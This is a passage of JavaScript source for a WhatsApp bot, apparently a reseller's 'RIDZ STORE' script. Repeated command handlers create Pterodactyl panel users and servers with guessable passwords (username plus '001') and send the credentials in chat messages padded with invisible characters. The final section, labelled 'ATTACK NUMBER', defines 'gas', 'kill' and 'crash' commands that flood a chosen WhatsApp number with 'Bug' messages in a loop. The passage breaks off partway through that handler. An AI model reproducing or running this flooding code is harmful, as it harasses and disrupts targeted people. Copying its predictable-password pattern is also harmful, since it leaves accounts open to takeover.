͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
⎙─➣ 𝘐𝘋 : ${user.id}
⎙─➣ 𝘌𝘮𝘢𝘪𝘭 : ${user.email}
⎙─➣ 𝘜𝘴𝘦𝘳𝘯𝘢𝘮𝘦 : ${user.username}
⎙─➣ 𝑃𝑎𝑠𝑠𝑤𝑜𝑟𝑑 : ${password}
⎙─➣𝐿𝑖𝑛𝑘 𝐿𝑜𝑔𝑖𝑛 : ${domain}
⎙─➣ 𝑃𝑒𝑚𝑖𝑙𝑖𝑘 𝑆𝑒𝑟𝑣𝑒𝑟 : RIDZ STORE

𝙏𝙐𝙏𝙊𝙍 𝙍𝙐𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝘼𝙉𝙀𝙇 : https://drive.google.com/file/d/1CL7-jCXy2sZmVeKDAo5FYmr1OjvkUhGZ/view?usp=drivesdk

𝙒𝙀𝘽 𝙊𝙒𝙉𝙀𝙍 : https://lynk.id/tds4youshop 

𝙂𝙍𝙐𝙋 𝙊𝙒𝙉𝙀𝙍 : https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j
▰▱▰▱▰▱▰▱▰▱▰▱▰▰▱▰▱▰▱▰▱
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "9gb": {
    if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "RIDZ STORE"
let egg = global.eggsnya
let loc = global.location
let memo = "9000"
let cpu = "200"
let disk = "9000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/5f441449176f49ca93d4a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*======[ 𝘽𝙀𝙍𝙄𝙆𝙐𝙏 𝘼𝘿𝘼𝙇𝘼𝙃 𝘿𝘼𝙏𝘼 𝙋𝘼𝙉𝙀𝙇 𝘼𝙉𝘿𝘼 ]======*\n

͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
⎙─➣ 𝘐𝘋 : ${user.id}
⎙─➣ 𝘌𝘮𝘢𝘪𝘭 : ${user.email}
⎙─➣ 𝘜𝘴𝘦𝘳𝘯𝘢𝘮𝘦 : ${user.username}
⎙─➣ 𝑃𝑎𝑠𝑠𝑤𝑜𝑟𝑑 : ${password}
⎙─➣𝐿𝑖𝑛𝑘 𝐿𝑜𝑔𝑖𝑛 : ${domain}
⎙─➣ 𝑃𝑒𝑚𝑖𝑙𝑖𝑘 𝑆𝑒𝑟𝑣𝑒𝑟 : RIDZ STORE

𝙏𝙐𝙏𝙊𝙍 𝙍𝙐𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝘼𝙉𝙀𝙇 : https://drive.google.com/file/d/1CL7-jCXy2sZmVeKDAo5FYmr1OjvkUhGZ/view?usp=drivesdk

𝙒𝙀𝘽 𝙊𝙒𝙉𝙀𝙍 : https://lynk.id/tds4youshop 

𝙂𝙍𝙐𝙋 𝙊𝙒𝙉𝙀𝙍 : https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j
▰▱▰▱▰▱▰▱▰▱▰▱▰▰▱▰▱▰▱▰▱
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "10gb": {
    if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "RIDZ STORE"
let egg = global.eggsnya
let loc = global.location
let memo = "10000"
let cpu = "200"
let disk = "10000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/5f441449176f49ca93d4a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*======[ 𝘽𝙀𝙍𝙄𝙆𝙐𝙏 𝘼𝘿𝘼𝙇𝘼𝙃 𝘿𝘼𝙏𝘼 𝙋𝘼𝙉𝙀𝙇 𝘼𝙉𝘿𝘼 ]======*\n

͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
⎙─➣ 𝘐𝘋 : ${user.id}
⎙─➣ 𝘌𝘮𝘢𝘪𝘭 : ${user.email}
⎙─➣ 𝘜𝘴𝘦𝘳𝘯𝘢𝘮𝘦 : ${user.username}
⎙─➣ 𝑃𝑎𝑠𝑠𝑤𝑜𝑟𝑑 : ${password}
⎙─➣𝐿𝑖𝑛𝑘 𝐿𝑜𝑔𝑖𝑛 : ${domain}
⎙─➣ 𝑃𝑒𝑚𝑖𝑙𝑖𝑘 𝑆𝑒𝑟𝑣𝑒𝑟 : RIDZ STORE

𝙏𝙐𝙏𝙊𝙍 𝙍𝙐𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝘼𝙉𝙀𝙇 : https://drive.google.com/file/d/1CL7-jCXy2sZmVeKDAo5FYmr1OjvkUhGZ/view?usp=drivesdk

𝙒𝙀𝘽 𝙊𝙒𝙉𝙀𝙍 : https://lynk.id/tds4youshop 

𝙂𝙍𝙐𝙋 𝙊𝙒𝙉𝙀𝙍 : https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j
▰▱▰▱▰▱▰▱▰▱▰▱▰▰▱▰▱▰▱▰▱
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
// ATTACK NUMBER
case "gas": case "kill": case "crash":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { text: "RIDZ STORE Bug🔥`" }, { quoted: lep })
Biiofc.sendMessage(prrkek, { text: "RIDZ STOREl Bug🔥`" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb RaffOffcial`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
